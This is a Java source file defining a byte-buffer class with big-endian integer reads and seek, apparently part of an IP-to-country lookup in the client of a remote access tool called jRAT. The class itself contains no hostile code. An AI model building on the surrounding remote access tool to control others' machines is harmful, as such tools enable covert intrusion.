package pro.jrat.client.ip2c;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class RandomAccessBuffer implements RandomAccessInput {
	private byte[] m_buffer;
	private int m_offset;

	public RandomAccessBuffer(String paramString) throws IOException {
		File localFile = new File(paramString);
		byte[] arrayOfByte = new byte[(int) localFile.length()];
		FileInputStream localFileInputStream = new FileInputStream(localFile);
		DataInputStream localDataInputStream = new DataInputStream(localFileInputStream);
		localDataInputStream.readFully(arrayOfByte);
		localFileInputStream.close();
		this.m_buffer = arrayOfByte;
		this.m_offset = 0;
	}

	public RandomAccessBuffer(byte[] paramArrayOfByte) {
		this.m_buffer = paramArrayOfByte;
		this.m_offset = 0;
	}

	public int readInt() throws IOException {
		int i = this.m_buffer[(this.m_offset++)];
		int j = this.m_buffer[(this.m_offset++)];
		int k = this.m_buffer[(this.m_offset++)];
		int m = this.m_buffer[(this.m_offset++)];
		return i << 24 & 0xFF000000 | j << 16 & 0xFF0000 | k << 8 & 0xFF00 | m << 0 & 0xFF;
	}

	public short readShort() throws IOException {
		int i = this.m_buffer[(this.m_offset++)];
		int j = this.m_buffer[(this.m_offset++)];
		return (short) (i << 8 & 0xFF00 | j << 0 & 0xFF);
	}

	public void readFully(byte[] paramArrayOfByte) throws IOException {
		System.arraycopy(this.m_buffer, this.m_offset, paramArrayOfByte, 0, paramArrayOfByte.length);
		this.m_offset += paramArrayOfByte.length;
	}

	public void seek(long paramLong) throws IOException {
		this.m_offset = ((int) paramLong);
	}
}
